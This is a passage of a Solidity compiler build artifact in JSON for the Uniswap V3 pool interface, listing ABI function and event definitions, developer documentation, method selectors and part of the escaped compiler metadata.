									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "The pool interface is broken up into many smaller pieces",
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							}
						},
						"title": "The interface for a Uniswap V3 Pool"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"liquidity()": "1a686502",
							"maxLiquidityPerTick()": "70cf754a",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"observations(uint256)": "252c09d7",
							"observe(uint32[])": "883bdbfd",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"setFeeProtocol(uint8,uint8)": "8206a4d1",
							"slot0()": "3850c7bd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2",
							"swap(address,bool,int256,uint160,bytes)": "128acb08",
							"tickBitmap(int16)": "5339c296",
							"tickSpacing()": "d0c93a7c",
							"ticks(int24)": "f30dba93",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"b